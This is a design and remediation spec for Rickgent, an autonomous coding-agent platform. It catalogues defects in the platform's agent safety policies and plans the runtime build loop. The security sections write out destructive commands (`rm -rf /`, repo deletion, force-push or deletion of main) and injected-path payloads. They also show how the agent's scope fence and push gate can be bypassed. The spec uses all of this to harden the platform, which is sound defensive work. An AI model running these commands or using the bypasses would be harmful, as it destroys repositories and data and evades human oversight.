---
mission: 2
title: "Rickgent Mission 2 — Harden the alpha scaffold into a working autonomous platform"
predecessor: MISSION_PRD.md  # Mission 1 (v0.1.0-alpha)
implementer: GLM 5.2
goals:  # UNCHANGED from Mission 1 — priority order preserved
  - natively multi-model
  - hands-off execution between three human gates (PRD, plan, merge)
  - reliable, not brittle
  - measured PR quality, target 99% (defined in §5.4 of Mission 1)
design_principle: "Mission 1 investigated and mashed. Mission 2 makes the mash RUN: wire the verified core into a live autonomous loop, and close the correctness gaps that a green test suite hid."
review_provenance: "Three independent reviews of the v0.1.0-alpha tree (afe90bd..HEAD) on 2026-07-13: /ll:pr-review (8 agents), a Codex cross-vendor pass (23 findings), and a 9-lens orthogonal agent team with adversarial verification. Findings cross-corroborated and re-verified against source before entry here."
---

# Rickgent — Mission 2: Harden the Alpha Scaffold into a Working Autonomous Platform

> *"Mission 1 built the lab. Mission 2 turns the lights on and makes sure the doors lock."*

## 0. Mission statement

Mission 1 (`MISSION_PRD.md`, v0.1.0-alpha) delivered a **correct, well-tested verdict core** and an **honestly-labeled scaffold** around it. Three independent reviews confirmed both halves of that sentence:

- **Real and sound:** the six TypeScript verdict-core functions (`completion`, `convergence`, `scope`, `prd`, `salvage`, `breaker`), 188 passing TS tests + 85 passing Python tests, correct fail-closed posture on the cold-path shims.
- **Scaffold:** the autonomous execution surfaces (`build`, `pipeline`, `metrics`) are stubs that exit without doing work; the Python policies exist but are **not attached** to the agent bundle; dispatch accepts an exit code as proof of completion; microverse/salvage/reconcile are simulated or partial; the manager and worker are hardcoded to a single vendor.

Mission 2 has one job: **make the platform actually deliver its four goals at runtime**, and **fix the correctness defects** the green test suite masked. It is divided into two workstreams:

- **Workstream A — Correctness (§3):** ~18 verified defects in code that already exists. Bounded, each with a file:line, a failure scenario, and a required fix. Landing these keeps the existing suites green and does not require new subsystems.
- **Workstream B — Capability completion (§4):** the stubbed lifecycle. Each subsystem has a "current state → target contract" spec. This is where the platform becomes autonomous.

**Sequencing is a hard requirement, not a suggestion** (see §8). Several Workstream A security fixes (the `autonomous_pr_flow` and scope-fence defects) are **latent** today because no live dispatch path reaches them — the orthogonal review verified there is no production caller of the Dispatcher and `rickgent build` exits 1. They become **live CRITICAL** the moment Workstream B wires the build loop. Therefore: **the policy-attachment and policy-correctness work (A-SEC-* + B4) MUST land and be enforced before the dispatch/build loop (B1–B3) is enabled.** Do not turn on the worker loop over an ungated shell.

---

## 1. Current-state assessment — what Mission 1 actually shipped

This section is the ground truth Mission 2 builds on. Every claim here was verified against the source tree at the reviewed HEAD.

### 1.1 What works (do not rebuild — extend)

| Component | File | State |
|---|---|---|
| Completion oracle | `orchestrator/src/core/completion.ts` | Real, one predicate, allowlist present, fail-closed. **One defect (A-SEC-6).** |
| Convergence gate | `orchestrator/src/core/convergence.ts` | Real, baseline-staleness + silence≠success correct. **One defect (A-BUG-1).** |
| Scope fence (core) | `orchestrator/src/core/scope.ts` | Real, `..`/absolute correct. **One defect (A-SEC-4, symlink).** |
| PRD model | `orchestrator/src/core/prd.ts` | Real, requires simplification review. **One defect (A-BUG-2).** |
| Salvage decision | `orchestrator/src/core/salvage.ts` | Real decision logic. **One defect (A-BUG-3, no field coercion).** |
| Circuit breaker | `orchestrator/src/core/breaker.ts` | Real, git-tree-truth over worker claims. Sound. |
| Verdict CLI | `orchestrator/src/core/verdict-cli.ts` | Real, stdin JSON, fixed argv. **One defect (A-BUG-8, errorCount).** |
| Python cold-path shims | `rickgent-policies/rickgent_policies/__init__.py` | Fail-closed DENY correct on error/timeout/malformed. |

### 1.2 What is stubbed or partial (Workstream B builds these)

| Capability | File:line | Current behavior | Verified by |
|---|---|---|---|
| `rickgent build` | `cli.ts:82` | Exits: `"build not yet implemented in v0.1.0-alpha scaffold"` | Codex CX-1, self |
| `rickgent build --resume` | `cli.ts:79` | Prints `"resume not yet wired"` | self |
| `rickgent pipeline` | `cli.ts:93` | Echoes `"pipeline: PRD path = <prd>"` and returns | Codex CX-1, self |
| `rickgent metrics` | `cli.ts:110` | Falls to `"not yet implemented"` branch | Codex CX-5, self |
| Policy attachment | `agents/rickgent/config.yaml` | No `policy_modules`/`guardrails` block; zero policies attached | Codex CX-2, orthogonal (builder.py:313 empty list), self |
| Dispatch completion | `dispatch.ts:220` | Exit code 0 → `completed`, no evidence | Codex CX-3, self |
| Dispatch backpressure | `dispatch.ts:~134` | Returns `planned`, no queue consumer ever drains it | Codex CX-9 |
| Microverse loop | `microverse.ts:37` | `runSimulated(scores)` only — no dispatch/metric/git | Codex CX-12 |
| Salvage execution | `lifecycle/salvage.ts` | `ff-reattached` reports `executed:true`, mutates nothing; `archived-todo` not durable | Codex CX-11 |
| Reconcile | `reconcile.ts:53` | Reads snake_case fields the ledger never writes → recovers nothing | 2B-1, Codex CX-4, self |
| Orphan reaper | `orphan-reaper.ts:213` | Backend-gating correct; reap loop skips EVERY candidate | 4 agents, self |
| Multi-vendor routing | `worker/config.yaml`, `config.yaml` | Manager + worker hardcoded `claude` / `anthropic/claude-sonnet-4`; advice tools never called | Codex CX-6 |

---

## 2. Workstream map

```
WORKSTREAM A (correctness — fix existing code)      WORKSTREAM B (capability — build the loop)
├─ A-SEC (security, must precede B enablement)      ├─ B1 build/pipeline execution surfaces
│   A-SEC-1  autonomous_pr_flow refspec bypass      ├─ B2 evidence-based dispatch completion
│   A-SEC-2  autonomous_pr_flow bare-ALLOW abstain  ├─ B3 backpressure queue + resume
│   A-SEC-3  scope-fence shell-write fail-open      ├─ B4 policy ATTACHMENT to the bundle
│   A-SEC-4  scope symlink escape (TS+PY)           ├─ B5 real microverse loop
│   A-SEC-5  salvage.ts shell injection             ├─ B6 real salvage execution + reconcile
│   A-SEC-6  completion caller optional bypass      ├─ B7 orphan-reaper ownership attribution
├─ A-BUG (correctness bugs)                         ├─ B8 multi-vendor routing
│   A-BUG-1  convergence scope boundary             └─ B9 metrics ledger + rickgent metrics
│   A-BUG-2  prd \bhttp\b false-block
│   A-BUG-3  salvage core no field coercion         WORKSTREAM C (test integrity — §5)
│   A-BUG-4  dispatch corrupt-lock NaN wedge        ├─ C1 conformance vs legacy reference (AC-16)
│   A-BUG-5  registry.ts parse crash                ├─ C2 coverage manifest self-certification
│   A-BUG-6  protected-branch startswith            ├─ C3 empty/spawn-fail-pass tests
│   A-BUG-7  reconcile schema mismatch (→ B6)       └─ C4 policy-attachment enforcement test
│   A-BUG-8  verdict-cli errorCount arbitrary
└─ A-CLEAN (dead code / guards-on-guards, §3.3)
```

---

## 3. Workstream A — Correctness defect register

Each entry: **file:line · current · required · failure scenario · fix · AC**. All line numbers are against the reviewed HEAD; GLM must confirm by reading before editing (the tree may have advanced).

### 3.1 A-SEC — Security defects (BLOCK B enablement — see §8)

> **Context that governs all A-SEC severities:** these are **latent** in v0.1.0-alpha because no live dispatch path reaches the policies (verified: no production caller of `Dispatcher`; `rickgent build` exits 1; the policies are not even attached — B4). They are entered here at the severity they will carry **once B4 + B1 are live**. They must be fixed and enforced *before* the build loop is enabled.

#### A-SEC-1 — `autonomous_pr_flow` refspec bypasses grant force-push / delete of `main`
- **File:** `rickgent-policies/rickgent_policies/__init__.py:379-401`
- **Current:** branch destination extracted via `\borigin\s+(\S+)`, compared to a protected list; several push shapes reach `return {"result": "ALLOW"}`.
- **Verified bypasses, each returns explicit ALLOW:**
  - `git push origin +main` → force-push to `main` (the force regexes at ~371-374 match `-f`/`--force` only, never a `+`-prefixed refspec)
  - `git push origin :main` → **deletes** remote `main` (colon-delete)
  - `git push origin --mirror` → force-overwrite + delete remote branches
  - `git push origin --all` → pushes every local branch including `main`
  - `git push` / `git push origin` → dest `None`, `if dest_branch:` false → ALLOW to configured upstream
  - `git push origin HEAD` (HEAD==main) → pushes to `main`
- **Why it matters:** this is the *narrow exception* the Mission 1 forbidden-ops remediation prescribed. Its whole purpose is to convert `blast_radius`'s push-ASK into an ALLOW, so its ALLOW is authoritative — an unattended worker can force-push or delete `main`. Breaks goals 2 and 3; violates `docs/decisions/forbidden-ops.md`.
- **Required behavior:** ALLOW **only** a plain, non-force push of the current ticket's own feature branch to `origin`, i.e. exactly `git push origin <feature-branch>` or `git push origin HEAD:<feature-branch>` where `<feature-branch>` is not protected and is the dispatch's own branch. DENY (or abstain to `blast_radius`) on: any `+`-prefixed refspec, any `:`-refspec (delete), `--mirror`, `--all`, `--delete`/`-d`, `--force`/`-f`/`--force-with-lease`, `--tags`, absent explicit `origin <branch>` destination, or a destination that does not equal the dispatch's feature branch.
- **Fix:** parse the push into (remote, refspec, flags) structurally; resolve the concrete destination ref; reject the enumerated shapes above; require the resolved dest to equal the run's ticket feature branch. Do not rely on substring matching of the raw command.
- **AC:** M2-AC-SEC-1.

#### A-SEC-2 — `autonomous_pr_flow` returns affirmative ALLOW for every non-matching command (must ABSTAIN)
- **File:** `rickgent-policies/rickgent_policies/__init__.py:341, 355, 364`
- **Current:** for a non-tool event, a command with no `command` field, or any command that is not `git push` / `gh pr create`, the policy returns `{"result": "ALLOW"}`.
- **Why it matters:** a policy that does not apply must **abstain**, not ALLOW. As written, `autonomous_pr_flow` votes ALLOW on `gh repo delete owner/repo --yes`, `rm -rf /`, `terraform destroy`, `git push --force origin main`. For the policy to function at all (turn a push-ASK into allowed), the engine must let ALLOW override ASK — under that same precedence, these blanket ALLOWs override `blast_radius`'s DENY, un-gating repo-delete / infra-destroy / rm-rf. The Mission 1 remediation's claim that this policy "cannot be widened / does not depend on cross-policy precedence" is **false as implemented** — that claim addressed a *sibling* widening `autonomous_pr_flow`, not `autonomous_pr_flow`'s own blanket ALLOW overriding a sibling DENY.
- **Required behavior:** return an explicit verdict ONLY for the two whitelisted shapes (narrow feature-branch push per A-SEC-1; `gh pr create`). Return `None` (omnigent abstain convention) for everything else, so `blast_radius` remains authoritative regardless of composition precedence.
- **Fix:** replace every non-matching `return {"result":"ALLOW"}` with `return None`. Add a test that the policy abstains on `gh repo delete`, `rm -rf`, `terraform destroy`, and force-push.
- **AC:** M2-AC-SEC-2.

#### A-SEC-3 — Scope-fence shell-write detection is an evadable substring denylist that fails open
- **File:** `rickgent-policies/rickgent_policies/__init__.py:146-157` (write-op detection), `:169-172` (target resolution)
- **Current:** `is_write` decided by substring membership in a `write_ops` list plus a `>` redirect regex; unmatched → `return {"result":"ALLOW"}`. When a write *is* detected, the target is read from `event["path"|"file_path"|"target"]`, which a shell event does not carry → always `DENY: unresolvable write target`.
- **Verified evasions (write to disk, return ALLOW):** `python3 -c "open('/etc/x','w')..."` (list has `python -c`, not `python3 -c`), `perl -e`, `ruby -e`, `php -r`, `git apply evil.patch`, `git am`, `tar xf a -C /`, `unzip`, `ln -sf / link`, `truncate -s0 f`, `chmod`, `chown`.
- **Why it matters:** the shell scope fence provides **zero real path-scoping** — bypass → ALLOW is trivial, and the detected path always DENYs. It only constrains the structured `Write`/`Edit` tools. Breaks goals 2 and 3.
- **Required behavior:** a shell command whose filesystem write-targets cannot be positively resolved and scope-checked must **DENY**, not ALLOW. Preferred design (choose one, record the decision): (a) disallow ad-hoc `sys_os_shell` writes in the worker bundle and route all writes through structured `Write`/`Edit` tools that the fence *can* resolve; or (b) resolve concrete target paths from the parsed command and scope-check each, defaulting to DENY on any unresolved write.
- **Fix:** invert the default (unresolved shell write → DENY); stop enumerating mutators by substring. Coordinate with B4 (the fence must actually be attached for this to matter).
- **AC:** M2-AC-SEC-3.

#### A-SEC-4 — Scope canonicalization is lexical-only → symlink escape (TS and Python)
- **Files:** `orchestrator/src/core/scope.ts:62-85`, `rickgent-policies/rickgent_policies/__init__.py:96-117`
- **Current:** both collapse `.`/`..` by string manipulation with no `realpath`/symlink resolution. `..` and absolute-path collapse are correct; symlinks are not.
- **Failure scenario:** a symlink inside a declared dir (`ln -s / declared/root`, creatable via the A-SEC-3 bypass) makes `Edit declared/root/etc/passwd` canonicalize to an in-scope string while the OS follows the link out of scope.
- **Required behavior:** resolve the target and the declared roots with `fs.realpathSync` / `os.path.realpath` (falling back to the nearest existing parent for not-yet-created paths), then prefix-check the resolved paths; also check both source and destination of rename/link operations. Preserve the existing `..`/absolute handling. Maintain TS↔Python parity (pinned by the AC-10 shared fixtures — extend those fixtures with symlink cases).
- **AC:** M2-AC-SEC-4.

#### A-SEC-5 — Command injection in the salvage executor
- **File:** `orchestrator/src/lifecycle/salvage.ts:28` (and any sibling `git commit`/`git rev-parse` interpolations in the same file)
- **Current:** `execSync(\`git add "${path}"\`, {cwd, timeout})` in a loop over `decision.stagedPaths`. `execSync` invokes `/bin/sh -c`; double-quoting does not stop `$(...)` substitution.
- **Failure scenario:** `path` originates from `decision.stagedPaths` ← `input.ownedPaths` (`core/salvage.ts:51,60`), which are model-authored (PRD breakdown) or read untrusted from the ledger's `declared_paths`. A declared path `foo$(gh repo delete $O/$R --yes)` or `foo";rm -rf ~;"` executes arbitrary commands with the agent's git/gh credentials — entirely outside the policy shims (orchestrator code, never seen by `blast_radius`/`scope_fence`). Currently HIGH (no live caller of `SalvageExecutor`); becomes CRITICAL when B6 wires it.
- **Required behavior:** never interpolate a path into a shell string. Use `execFileSync("git", ["add", "--", path], {cwd})` (array argv, no shell), and prefix `--` to stop option injection. Same for every other git invocation in the executor.
- **AC:** M2-AC-SEC-5.

#### A-SEC-6 — Completion-oracle caller allowlist is bypassable via the optional parameter
- **File:** `orchestrator/src/core/completion.ts:38, 42`
- **Current:** `export function evaluateCompletion(input, caller?: string)` — caller is optional, and the guard is `if (caller != null && !ALLOWED_COMPLETION_CALLERS.has(caller)) throw`. Omitting `caller` skips the allowlist check entirely.
- **Why it matters:** AC-5's "single oracle, pinned callers" is defeated by any call site that simply passes no caller. The Mission 1 tests (and the review's Agent #1/#8) verified the allowlist *set* is correct and the exported-symbol count is 1, but not that the parameter is *mandatory* — Codex CX-18 caught it.
- **Required behavior:** make `caller` required (non-optional, typed as a union/branded type of the allowed caller ids). Every call site must pass its identity. The AC-5 static-import-graph audit must additionally assert there is no call to `evaluateCompletion` lacking a caller argument.
- **Fix:** change the signature to `caller: CompletionCaller`, remove the `!= null` short-circuit (`if (!ALLOWED_COMPLETION_CALLERS.has(caller)) throw`), update all call sites, extend the AC-5 audit.
- **AC:** M2-AC-SEC-6.

### 3.2 A-BUG — Correctness bugs

#### A-BUG-1 — Convergence scope filter has no path boundary (`src` matches `src2/`)
- **File:** `orchestrator/src/core/convergence.ts:106-110` (`filterByScope`)
- **Current:** `scope.some(s => f.file.startsWith(s))` — no directory boundary. Diverges from the canonical `isPathInScope` in `scope.ts:77-85` (which appends `/`).
- **Failure scenario:** ticket scope `["src"]`, finding in `src2/foo.ts` → `"src2/foo.ts".startsWith("src")` true → out-of-scope finding retained → `evaluateConvergenceGate` returns `passed:false`. A ticket is blocked by an unrelated sibling directory. Corroborated by two agents (2a, 2b).
- **Fix:** reuse `isPathInScope` from `scope.ts` (export it if needed); do not maintain a second path-matching implementation.
- **AC:** M2-AC-BUG-1.

#### A-BUG-2 — PRD validator rejects valid verify commands containing "http"
- **File:** `orchestrator/src/core/prd.ts:66`
- **Current:** `/\bcurl\b|\bwget\b|\bhttp\b/.test(verifyCommand)` flags the bare word "http".
- **Failure scenario:** `vitest run http.test.ts` or `pytest tests/test_http.py` contains `http` + word-boundary `.` → PRD rejected as "has network command". A valid PRD is blocked, breaking hands-off PRD intake.
- **Fix:** match actual network invocations — require a scheme (`https?://`) or command-position `curl`/`wget` (e.g. `(^|\s|;|&&|\|)\s*(curl|wget)\b`), not any token containing "http".
- **AC:** M2-AC-BUG-2.

#### A-BUG-3 — Salvage core does not coerce its fields (the one verdict fn that skips fail-closed coercion)
- **File:** `orchestrator/src/core/salvage.ts:32-77` (`decideSalvage`)
- **Current:** unlike `evaluateCompletion`/`evaluateConvergenceGate`/`checkScope`/`evaluatePrd`, `decideSalvage` reads `input.orphanReset`/`input.gatePassed`/`input.treeChanged` by truthiness and passes `input.ownedPaths` straight to `stagedPaths` with no `Array.isArray` check. Reached from `verdict-cli.ts:50` with `input as SalvageInput` (untrusted stdin).
- **Failure scenario:** `stagedPaths` in the returned decision can be a non-array (e.g. a string) → `lifecycle/salvage.ts:25-28` does `decision.stagedPaths.length>0` and `for (const path of decision.stagedPaths)` → a string iterates per-character, feeding single characters to `git add` (compounds A-SEC-5).
- **Fix:** coerce to match siblings: `const ownedPaths = Array.isArray(input.ownedPaths) ? input.ownedPaths.filter(p=>typeof p==="string") : []`; booleans via `=== true`.
- **AC:** M2-AC-BUG-3.

#### A-BUG-4 — Corrupt/empty dispatch lock file wedges a ticket forever
- **File:** `orchestrator/src/dispatch/dispatch.ts:78-90` (`acquire`)
- **Current:** `const lockTime = parseInt(readFileSync(lockPath), 10)` then `if (Date.now() - lockTime > timeoutMs)` takes the stale lock. If the lock file is empty/corrupt (crash mid-`writeFileSync`), `lockTime` is `NaN`; `Date.now() - NaN > timeoutMs` is `NaN > n` → always false → stale-takeover never fires → `acquire` returns false forever → ticket permanently unacquirable.
- **Secondary:** `acquire()` is called at ~line 151 outside the `try`; the `existsSync`→`readFileSync` TOCTOU can throw ENOENT if another dispatch releases concurrently.
- **Fix:** treat `Number.isNaN(lockTime)` (and any read failure) as a stale lock and take it; wrap the read so a concurrent release cannot reject `dispatch()`.
- **AC:** M2-AC-BUG-4.

#### A-BUG-5 — `registry.ts` parses JSON with an unchecked cast → `rickgent status` crashes
- **File:** `orchestrator/src/lifecycle/registry.ts:33` (and `:46, :51`)
- **Current:** `JSON.parse(readFileSync(...)) as PipelineStatus`; the `try/catch` catches parse failures, not wrong-shape valid JSON. A registry file of `{}` (hand-edited or truncated write) yields `tickets: undefined`, which flows to `cli.ts:155/157` `Object.keys(status.tickets)` / `Object.entries(...)` → `TypeError`. `getTicketState`/`updateTicketState` crash the same way. This is the one loader that does not fail-closed.
- **Fix:** after parse, validate/normalize — if `!p || typeof p!=="object" || typeof p.tickets!=="object" || p.tickets===null`, return an empty normalized state; coerce `tickets` to `{}`.
- **AC:** M2-AC-BUG-5.

#### A-BUG-6 — Protected-branch match uses `startswith`, over- and under-matching
- **File:** `rickgent-policies/rickgent_policies/__init__.py:398-400`
- **Current:** `if dest_branch == branch or dest_branch.startswith(branch)` with `protected = ["main","master","trunk","develop","dev","release/"]`. `startswith` is correct only for `release/`. `git push origin maintenance` → `"maintenance".startswith("main")` → wrongly DENIED; `develop-notes`, `master-plan`, `trunk-based-x` likewise (availability). Two agents (2b, security).
- **Fix:** exact match for bare names, prefix only for entries ending in `/`: `dest == p or dest.startswith(p + "/")`. Fold into the A-SEC-1 structural parser.
- **AC:** M2-AC-BUG-6.

#### A-BUG-7 — Reconcile reads a schema the ledger never writes (see B6)
- **File:** `orchestrator/src/lifecycle/reconcile.ts:53-72` vs `orchestrator/src/dispatch/dispatch.ts:22-31,46`
- **Current:** `reconcile()` reads `entry["ticket_id"]`, `entry["state"]==="completed"`, `entry["commit_sha"]`, `entry["declared_paths"]`. `DispatchLedger.append()` writes `dispatchId` (a `runId/ticketId/phase/attempt/role` string), `state`, `pid`, timestamps, `exitCode`, `stdout`/`stderr` — none of the snake_case fields. Reconcile also hardcodes filename `dispatch-ledger.jsonl` while the Dispatcher writes to its constructed `ledgerPath`.
- **Failure scenario:** operator runs `rickgent reconcile` after a crash → the `typeof ticketId==="string"` guard fails for every real line → zero tickets recovered from the ledger → silently degrades to git-log-only → still reports `ok:true`. A real failure reported as success (AC-4 recovery). Also flagged as "manufactures Done from arbitrary `state==completed`" by Codex CX-4.
- **Fix:** this is both a bug and a capability gap — resolve it as part of **B6** (define one shared ledger schema carrying trace identity + evidence; reconcile parses `dispatchId` and validates the commit via `evaluateCompletion` before assigning `Done`). Entered here so the correctness AC is tracked.
- **AC:** M2-AC-B6 (shared with B6).

#### A-BUG-8 — Circuit-breaker `errorCount` reports an arbitrary signature
- **File:** `orchestrator/src/core/verdict-cli.ts:87`
- **Current:** `errorCount: Object.values(state.errorCounts)[0] ?? 0` — the count of whichever signature is first in insertion order, not the tripping or maximal one. Informational only (does not affect the breaker decision), but misleading in multi-signature fixtures. Two agents.
- **Fix:** `errorCount: Math.max(0, ...Object.values(state.errorCounts))` (or the tripping signature's count).
- **AC:** M2-AC-BUG-8.

### 3.3 A-CLEAN — Dead code / guards-on-guards (FOM "subtract before you add")

These are not behavior bugs but violate the reliability goal's "no guards-on-guards / subtract before you add." Fix opportunistically **within the file a Workstream A/B change already touches**; do not open files solely for these. Where a symbol becomes live under Workstream B (e.g. the orphan-reaper helpers under B7), keep it — mark with a `// B7` comment instead of deleting.

| id | file:line | issue |
|---|---|---|
| A-CLEAN-1 | `orphan-reaper.ts` `isProcessAlive`(138), `sleepSync`(147), `GRACE_POLL_MS`(41), `graceMs`(171), `killProcessGroup`(73, test-only) | dead until B7 wires reaping — **keep, mark `// B7`**, do not delete |
| A-CLEAN-2 | `cli.ts:97-113` | `implemented` array + `includes` is dead (all commands return/exit earlier); collapses to the error/exit — resolve as part of B1 |
| A-CLEAN-3 | `dispatch.ts:95-100` | triple guard on delete: `existsSync` + `try/catch` + `rmSync({force:true})`; `force:true` already no-throws on missing → `rmSync(lockPath,{force:true})` |
| A-CLEAN-4 | `phase.ts:38-42,48-49` | unreachable `undefined`/`?? null` branches (index bound already guarantees defined) — reconcile with B-phase work |
| A-CLEAN-5 | `microverse.ts:81-86` | `isConverged` unused `score` param + redundant `history.length<3` re-check (caller already gates) — resolve in B5 |
| A-CLEAN-6 | `convergence.ts:53` vs `80-81` | duplicated `baseline.length===0` staleness guard |
| A-CLEAN-7 | `__init__.py:76-91` | `_assert_build_commit` dead — **wire it (see C4/B4)**, do not delete: it is the TS↔Python build-parity guard |
| A-CLEAN-8 | `__init__.py:370-375` | force-push regex `\s-f\b` subsumed by the next regex — fold into A-SEC-1 rewrite |
| A-CLEAN-9 | `breaker.ts:61-81` | duplicated reset block (error vs no-error branches identical but for reason string); hoist |
| A-CLEAN-10 | `__init__.py:140,345` | `import json as _json` shadows module-level `json` |
| A-CLEAN-11 | `scope.ts:24-32` | convoluted tri-state boolean; `if (typeof input.isWrite !== "boolean") return DENY` |

---

## 4. Workstream B — Capability completion

Each subsystem: **current state → target contract → key requirements → AC**. GLM implements the target contract; the ACs are the machine-checkable definition of done. Respect the §8 ordering.

### B1 — `build` and `pipeline` execution surfaces
- **Current:** `cli.ts:82` build exits "not yet implemented"; `cli.ts:93` pipeline echoes the PRD path; `cli.ts:79` `--resume` prints "not yet wired".
- **Target contract:** `rickgent build <prd>` runs the full autonomous lifecycle for one PRD between the plan gate and the merge gate: PRD parse (`core/prd.ts`) → ticket decomposition → for each ticket, the 8-phase machine (`lifecycle/phase.ts`) driving worker dispatch (`dispatch/dispatch.ts`, via B2) → completion oracle (`core/completion.ts`) → convergence gate → salvage/retry on failure (B6) → circuit breaker (`core/breaker.ts`) → cross-vendor review (B8) → conformance audit → deslopping → autonomous PR creation (gated by `autonomous_pr_flow`, B4). `rickgent pipeline <prd>` runs build then the cleanup chain. `rickgent build --resume` resumes via reconcile (B6).
- **Key requirements:**
  1. `build` must have a real production call path into `Dispatcher` (the orthogonal review verified none exists today).
  2. Every completion decision routes through `evaluateCompletion` with a valid caller (A-SEC-6); no command may declare a ticket Done by any other path (AC-5 import-graph audit must still pass).
  3. Between the three human gates there are **zero** required human interventions; failures route to salvage/breaker, not to a prompt or a printed command (goal 2).
  4. Exit non-zero and record an intervention (B9) whenever a human gate is hit.
- **AC:** M2-AC-B1.

### B2 — Evidence-based dispatch completion
- **Current:** `dispatch.ts:220` records `completed` from `exitCode===0` alone; the `db_session_observed` state exists in the type union (`dispatch.ts:10`) but is never emitted.
- **Target contract:** a dispatch may reach `completed` only after: (a) an Omnigent DB session is observed for the run (`db_session_observed` transition actually emitted), (b) the session transcript is non-empty, (c) the git tree shows the expected in-scope delta, and (d) `evaluateCompletion` returns a passing verdict on that evidence. Exit code 0 alone is **not** completion. Every other outcome routes through reconcile (B6) and salvage.
- **Key requirements:** the evidence hierarchy is git-tree-truth > worker claims (already honored by the breaker; extend to dispatch). A worker that emits a false success token but no git delta must NOT be accepted (this is the AC-6 `test_microverse_via_omnigent_run_fixture_agent` contract, extended to dispatch).
- **AC:** M2-AC-B2.

### B3 — Backpressure queue + resume
- **Current:** `dispatch.ts:~134` returns `planned` on capacity pressure (`max_concurrent_workers`, default 2); nothing ever drains it.
- **Target contract:** a durable FIFO scheduler drains `planned` entries when a worker slot frees, preserving trace ids and lock ordering. `build --resume` reconstructs in-flight and planned state from the ledger + git (B6) and continues. No ticket is permanently stranded by capacity pressure (goal 2).
- **AC:** M2-AC-B3.

### B4 — Policy attachment (THE safety-critical gate — precedes B1 enablement)
- **Current:** `agents/rickgent/config.yaml` declares tools + skills but **no** `policy_modules`/`guardrails` block; `rickgent_policies` is registered (POLICY_REGISTRY) but never attached to the bundle. Verified: omnigent `builder.py:313` yields an empty agent policy list without a guardrails block; `test_compat.py:18` asserts *registration*, not *attachment*. The worker bundle (`agents/rickgent/agents/worker/config.yaml`) likewise attaches nothing while exposing `sys_os_shell`.
- **Target contract:** both the manager and worker bundles attach the full required policy set as a validated allowlist, and startup **fails closed** if the effective attached set differs from the required set. Required set at minimum: `blast_radius(gate_pushes=True)`, `scope_fence`, `completion_evidence`, `convergence_gate` (advisory per `quality-gates.md` — see B-note), `subtract_before_add`, `cross_vendor_review`, `autonomous_pr_flow`. Lifecycle gates ride the `tool_call` event on rickgent-owned tools (`rickgent_phase_advance`, `rickgent_prd_validate`) per Mission 1 §4 — the omnigent event vocabulary is closed; do not invent event types.
- **Key requirements:**
  1. The worker bundle must NOT allow ad-hoc `sys_os_shell` writes that the scope fence cannot resolve (A-SEC-3): either drop `sys_os_shell` write capability in favor of structured tools, or ensure the attached fence DENYs unresolved shell writes.
  2. A startup/`doctor` check audits the *effective* attached policy set (not the registry) and aborts on mismatch (this is what `_assert_build_commit`/A-CLEAN-7 should also hook into).
- **AC:** M2-AC-B4.
- **B-note (quality-gates conformance):** `convergence_gate` currently BLOCKS `implement`/`spec_conformance` advancement (Codex CX-13) which contradicts `docs/decisions/quality-gates.md` ("gates are ADVISORY, not blocking"). When attaching it, make its per-phase verdict advisory (log + continue); reserve blocking for the machine-checkable build/full-PR gate. This is both a B4 attachment concern and a decision-conformance fix.

### B5 — Real microverse loop
- **Current:** `microverse.ts:37` `runSimulated(scores)` only — no dispatch, metric command, git rollback, salvage, gate, or breaker recording; "rollback" is a boolean.
- **Target contract:** the real measure→dispatch→classify→scoped-rollback→gate→salvage loop, with git-backed baselines, deadlines, and a final evidence report drawn from git, not worker claims. `runSimulated` is retained as a unit-test seam for the loop math but is not the production path.
- **Design decision to make explicit (do not silently inherit):** Mission 1 AC-6 defines `run_simulated([60,70,80]) → converged==True` — i.e. three consecutive improvements count as "converged." The review (2B-7) argues this is backwards from convergence-vs-attrition: three *improvements* means the metric is still climbing, so halting leaves gains on the table. **Decide and record** in `docs/decisions/microverse.md`: either (a) keep "N improvements = converged" and justify it as a productive-exit heuristic, or (b) redefine convergence as a plateau/diminishing-delta threshold (last-N improvements each below epsilon) and update AC-6's expected values. Do not leave the semantics implicit.
- **AC:** M2-AC-B5.

### B6 — Real salvage execution + reconcile (absorbs A-BUG-7)
- **Current:** `lifecycle/salvage.ts` `ff-reattached` reports `executed:true` while mutating nothing; `archived-todo` keeps the `git diff` in a returned string without a durable archive or registry reset. `reconcile.ts` reads a schema the ledger never writes (A-BUG-7).
- **Target contract:**
  - One **shared ledger schema** carrying trace identity (runId/ticketId/phase/attempt/role) and evidence fields (commit sha, declared paths, state), written by `DispatchLedger.append` and read by `reconcile` — no field mismatch, no hardcoded filename divergence.
  - Salvage dispositions are **durable and verified**: `archived-todo` persists a restorable scoped archive + trace metadata and resets the ticket to Todo; `ff-reattached` performs a real `git --ff-only` reattachment with explicit source/target refs; every disposition verifies post-state through the core before reporting `executed:true`.
  - Salvage staging uses `execFileSync` array argv (A-SEC-5) and owned-paths-only (never `git add -A`, per Mission 1 R-MACB).
  - `reconcile` validates each ledger entry's commit via `evaluateCompletion` before assigning `Done` (never manufactures Done from a bare `state==completed`).
- **AC:** M2-AC-B6 (also satisfies A-BUG-7, A-SEC-5 staging).

### B7 — Orphan-reaper ownership attribution
- **Current:** `orphan-reaper.ts:213-230` — backend-gating (kill-switch, `shouldReap`, win32 no-op, min-age) is correct, but the reap loop `skipped++` for every candidate because "positive-ownership attribution requires session infrastructure that isn't wired yet." `reaped` is always 0. Conforms to backend-gating half of `docs/decisions/orphan-reaping.md` but not the "active on darwin_seatbelt/none" half.
- **Target contract:** port positive-ownership attribution from session/trace metadata (the dispatch ledger + registry provide owning-session identity): a process is reaped ONLY when positively attributed to an owning session that is provably not live (live-state recheck at reap time), it passes the min-age gate, and SIGTERM→grace→SIGKILL escalation is applied to its process group. Preserve the invariants from the decision: **no `ppid==1`-only reap branch**; an unattributable process is NEVER killed; a live session's process is NEVER killed. Wire the currently-dead helpers (A-CLEAN-1: `killProcessGroup`, `isProcessAlive`, `sleepSync`, grace constants).
- **AC:** M2-AC-B7.

### B8 — Multi-vendor routing (goal 1)
- **Current:** `agents/rickgent/config.yaml:11` manager and `agents/rickgent/agents/worker/config.yaml:15` worker are hardcoded to `claude` / `anthropic/claude-sonnet-4-20250514`; the exposed `sys_advise_models`/`sys_list_models` tools are never called by production code; no harness/model selection by task or vendor.
- **Target contract:** a roster preflight enumerates available harnesses/models; a router selects a harness/model per role and task, persists a vendor label per dispatch, and — for review roles — explicitly excludes the implementer's vendor (cross-vendor review is the default, not opt-in, per goal 1 and `docs/decisions/cross-vendor-review.md`). Model routing is automatic; there is no `--backend` flag requirement.
